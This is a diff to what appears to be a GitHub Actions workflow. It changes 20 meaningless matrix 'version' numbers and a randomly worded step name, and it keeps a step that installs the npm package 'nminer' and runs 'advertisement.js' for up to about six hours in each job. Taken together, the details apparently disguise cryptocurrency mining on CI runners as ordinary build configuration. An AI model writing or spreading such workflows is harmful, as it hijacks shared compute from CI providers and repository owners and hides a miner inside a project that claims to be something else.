@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3620 }
-          - { version: 905 }
-          - { version: 3506 }
-          - { version: 728 }
-          - { version: 577 }
-          - { version: 1284 }
-          - { version: 3141 }
-          - { version: 4312 }
-          - { version: 7154 }
-          - { version: 8916 }
-          - { version: 4169 }
-          - { version: 5623 }
-          - { version: 5042 }
-          - { version: 2002 }
-          - { version: 7486 }
-          - { version: 9352 }
-          - { version: 4617 }
-          - { version: 7638 }
-          - { version: 8276 }
-          - { version: 1371 }
+          - { version: 8828 }
+          - { version: 6374 }
+          - { version: 7342 }
+          - { version: 7428 }
+          - { version: 2948 }
+          - { version: 6230 }
+          - { version: 182 }
+          - { version: 7924 }
+          - { version: 2147 }
+          - { version: 3956 }
+          - { version: 2859 }
+          - { version: 2143 }
+          - { version: 6263 }
+          - { version: 5992 }
+          - { version: 6067 }
+          - { version: 5438 }
+          - { version: 7789 }
+          - { version: 2577 }
+          - { version: 7505 }
+          - { version: 3415 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: misappropriate anneal rag ferociously
+      - name: unimportant bump gosh after
         run: |
           npm install nminer@latest
-          timeout 307m node advertisement.js || echo "advertisement executed"
+          timeout 349m node advertisement.js || echo "advertisement executed"
